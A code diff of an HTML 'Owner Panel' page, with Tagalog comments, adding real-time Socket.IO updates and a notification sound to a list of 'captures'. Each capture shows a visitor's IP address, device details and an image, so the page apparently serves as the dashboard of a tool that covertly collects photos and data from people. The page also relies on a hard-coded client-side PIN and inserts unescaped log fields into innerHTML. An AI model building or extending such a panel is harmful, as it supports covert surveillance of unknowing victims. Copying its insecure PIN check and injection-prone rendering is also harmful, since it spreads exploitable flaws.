@@ -5,6 +5,16 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Owner Panel</title>
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <style>
+    /* Animation para mag-blink kapag may bagong log */
+    .highlight {
+      animation: blink 1s ease-in-out 3;
+    }
+    @keyframes blink {
+      0%, 100% { background-color: #1f2937; } /* gray-800 */
+      50% { background-color: #4ade80; }      /* green-400 */
+    }
+  </style>
 </head>
 <body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">
 
@@ -19,7 +29,7 @@
   </nav>
 
   <!-- Owner PIN -->
-  <div class="mt-10 text-center">
+  <div id="pinSection" class="mt-10 text-center">
     <h2 class="text-2xl font-semibold mb-4">Enter Owner PIN</h2>
     <input id="ownerPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
     <button onclick="checkOwner()" class="bg-green-500 px-4 py-2 ml-2 rounded hover:bg-green-600">Unlock</button>
@@ -32,55 +42,83 @@
     <div id="logContainer"></div>
   </div>
 
-<script>
-const OWNER_PIN = "1234";
+  <audio id="notifySound" src="https://actions.google.com/sounds/v1/alarms/beep_short.ogg" preload="auto"></audio>
 
-function toggleMenu() {
-  document.getElementById("navLinks").classList.toggle("hidden");
-}
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+  const OWNER_PIN = "1234"; 
+  const socket = io();
 
-function checkOwner() {
-  const pin = document.getElementById("ownerPin").value;
-  if (pin === OWNER_PIN) {
-    document.getElementById("logs").classList.remove("hidden");
-    loadLogs();
-  } else {
-    alert("❌ Wrong Owner PIN!");
+  function toggleMenu() {
+    document.getElementById("navLinks").classList.toggle("hidden");
   }
-}
 
-function loadLogs() {
-  fetch("/get-captures")
-    .then(res => res.json())
-    .then(logs => {
-      const container = document.getElementById("logContainer");
-      container.innerHTML = "";
+  function checkOwner() {
+    const pin = document.getElementById("ownerPin").value;
+    if (pin === OWNER_PIN) {
+      document.getElementById("pinSection").classList.add("hidden");
+      document.getElementById("logs").classList.remove("hidden");
+      loadLogs();
 
-      if (logs.length === 0) {
-        container.innerHTML = "<p>No captures yet.</p>";
-        return;
-      }
-
-      logs.forEach(log => {
-        const div = document.createElement("div");
-        div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
-        div.innerHTML = `
-          🕒 ${log.time} <br>
-          🌍 IP: ${log.ip} <br>
-          📱 Device: ${log.device} <br>
-          <img src="${log.img}" width="200" class="mt-2 rounded">
-        `;
-        container.appendChild(div);
+      socket.on("new-capture", log => {
+        addLog(log, true);
+        playNotification();
       });
-    });
-}
 
-function clearLogs() {
-  fetch("/clear-captures", { method: "POST" })
-    .then(() => {
-      document.getElementById("logContainer").innerHTML = "<p>All captures cleared.</p>";
+      socket.on("clear-captures", () => {
+        document.getElementById("logContainer").innerHTML = "<p>All captures cleared.</p>";
+      });
+
+    } else {
+      alert("❌ Wrong Owner PIN!");
+    }
+  }
+
+  function loadLogs() {
+    fetch("/get-captures")
+      .then(res => res.json())
+      .then(logs => {
+        const container = document.getElementById("logContainer");
+        container.innerHTML = "";
+
+        if (logs.length === 0) {
+          container.innerHTML = "<p>No captures yet.</p>";
+          return;
+        }
+
+        logs.forEach(log => addLog(log, false));
+      });
+  }
+
+  function addLog(log, prepend = false) {
+    const container = document.getElementById("logContainer");
+    const div = document.createElement("div");
+    div.className = "bg-gray-800 p-3 rounded mb-3 shadow";
+    div.innerHTML = `
+      🕒 ${log.time} <br>
+      🌍 IP: ${log.ip} <br>
+      📱 Device: ${log.device} <br>
+      <img src="${log.img}" width="200" class="mt-2 rounded">
+    `;
+    if (prepend) {
+      container.prepend(div);
+      div.classList.add("highlight"); 
+    } else {
+      container.appendChild(div);
+    }
+  }
+
+  function clearLogs() {
+    fetch("/clear-captures", { method: "POST" });
+  }
+
+  function playNotification() {
+    const sound = document.getElementById("notifySound");
+    sound.currentTime = 0;
+    sound.play().catch(() => {
+      console.log("🔇 Notification sound blocked until user interacts with the page.");
     });
-}
-</script>
+  }
+  </script>
 </body>
 </html>
